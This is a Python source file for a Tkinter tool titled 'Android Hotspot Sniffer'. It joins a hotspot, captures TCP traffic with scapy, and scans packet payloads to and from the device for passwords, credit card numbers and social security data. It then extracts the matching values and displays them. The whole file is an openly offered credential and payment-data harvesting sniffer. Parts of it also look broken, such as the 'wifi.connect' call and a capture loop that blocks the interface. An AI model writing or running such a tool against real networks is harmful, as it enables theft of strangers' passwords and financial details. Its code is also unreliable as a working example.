import wifi
from scapy.all import *
import os
import re
import tkinter as tk

class AndroidHotspotSniffer:
    def __init__(self):
        self.window = None
        self.ssid_entry = None
        self.password_entry = None
        self.sensitive_data = None
        self.sniffing = False

    def connect_to_hotspot(self, ssid, password):
        try:
            wifi.connect(ssid, password)
            print("Connected to the Android hotspot.")
        except Exception as e:
            print(f"Error connecting: {e}")

    def sniff_data(self, iface):
        self.sniffing = True
        sniff(iface=iface, prn=self.process_packet)

    def process_packet(self, packet):
        try:
            if packet.haslayer(TCP):
                # Get the source and destination IP addresses
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst

                # Check if the packet is from or to the Android device
                if src_ip == "192.168.43.1" or dst_ip == "192.168.43.1":
                    # Get the payload of the packet
                    payload = bytes(packet[TCP].payload)

                    # Check if the payload contains sensitive data
                    if b'password' in payload or b'credit card' in payload or b'social security' in payload:
                        # Extract the sensitive data from the payload
                        extracted_data = re.findall(b'password=(.*)', payload) or re.findall(b'credit card=(.*)', payload)

                        # Print the sensitive data
                        for data in extracted_data:
                            decoded_data = data.decode()
                            print(decoded_data)
                            self.sensitive_data.insert(tk.END, f"{decoded_data}\n")
        except Exception as e:
            print(f"Error processing packet: {e}")

    def run(self):
        self.window = tk.Tk()
        self.window.title("Android Hotspot Sniffer")

        # Create a text box to enter the SSID of the Android hotspot
        tk.Label(self.window, text="SSID:").pack()
        self.ssid_entry = tk.Entry(self.window)
        self.ssid_entry.pack()

        # Create a text box to enter the password of the Android hotspot
        tk.Label(self.window, text="Password:").pack()
        self.password_entry = tk.Entry(self.window, show="*")
        self.password_entry.pack()

        # Create a text box to display the sensitive data that is extracted from the sniffed packets
        self.sensitive_data = tk.Text(self.window, height=20, width=50)
        self.sensitive_data.pack()

        # Create a button to connect to the Android hotspot
        self.connect_button = tk.Button(self.window, text="Connect", command=lambda: self.connect_to_hotspot(self.ssid_entry.get(), self.password_entry.get()))
        self.connect_button.pack()

        # Create a button to start sniffing data
        self.start_sniffing_button = tk.Button(self.window, text="Start Sniffing", command=lambda: self.sniff_data("wlan0"))
        self.start_sniffing_button.pack()

        self.window.mainloop()

# Run the AndroidHotspotSniffer
AndroidHotspotSniffer().run()
